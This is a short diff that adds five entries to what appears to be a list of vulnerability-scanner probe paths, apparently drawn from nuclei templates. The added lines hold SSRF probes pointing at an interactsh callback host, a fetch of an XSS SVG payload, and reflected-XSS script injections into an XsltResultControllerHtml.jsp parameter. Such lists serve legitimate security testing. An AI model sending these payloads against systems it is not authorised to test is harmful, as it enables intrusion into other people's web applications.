@@ -142,3 +142,8 @@
 /wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1
 /wp-content/plugins/protect-wp-admin/readme.txt
 /wp-login.php?action=lostpassword&error=invalidkey
+/o/get/httpmeta?url=https://{{interactsh-url}}
+/o/get/image?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
+/o/get/resource?url=https://{{interactsh-url}}
+/portal/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
+/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
